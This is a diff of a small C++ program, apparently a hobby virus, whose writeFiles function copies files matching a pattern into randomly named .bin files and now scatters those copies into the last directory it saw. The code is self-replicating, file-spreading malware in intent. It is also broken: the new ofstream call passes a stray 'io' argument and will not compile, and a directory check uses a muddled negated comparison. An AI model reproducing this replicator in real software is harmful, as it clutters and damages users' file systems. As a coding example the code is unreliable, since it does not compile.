@@ -1,9 +1,9 @@
-
 #include <dirent.h>
 #include <vector>
 #include <iostream>
 #include <fstream>
 #include <regex>
+#include <cstdlib>
 
 using namespace std;
 
@@ -44,48 +44,24 @@ void ListDir(const string &path, vector<string> &files)
 // write the file
 void writeFiles(vector<string> files)
 {
+  string directory = "";
   for (int i = 0; i < files.size(); i++)
   {
     try
     {
-      string file;
       if (regex_match(files[i], correctFile))
       {
-
-        string fileStringVirus = "";
-        fstream fileVirus;
-        string name = "a" + to_string(rand()) + ".out";
-        // open a file
-        fileVirus.open("./" + files[i], ios::binary | ios::in);
-
-        if (!fileVirus.fail())
-        {
-          // create a file
-
-          ofstream creatingAFile(name, ios::out | ios::binary);
-
-          while (fileVirus >> fileStringVirus)
-          {
-            // copy the file
-            creatingAFile << fileStringVirus;
-          };
-
-          // close the file
-          creatingAFile.close();
-        }
-        // finish
-        fileVirus.close();
+        ifstream fileVirus(files[i], ios::binary);
+        ofstream copyVirus((directory + "/a" + to_string(rand()) + ".bin"), ios::binary, io);
+        copyVirus << fileVirus.rdbuf();
       }
       // get the directories
-      if (!regex_match(files[i], itsAFile) == 0 && (files[i] != "." || files[i] != ".."))
-      {
-        cout << "its a directory"
-             << " " << files[i] << endl;
-      }
+      if (!regex_match(files[i], itsAFile) == 0 && files[i] != "..")
+        directory = files[i];
     }
     catch (...)
     {
-      cout << "fuck";
+      cout << "fuck" << endl;
     }
   }
 }
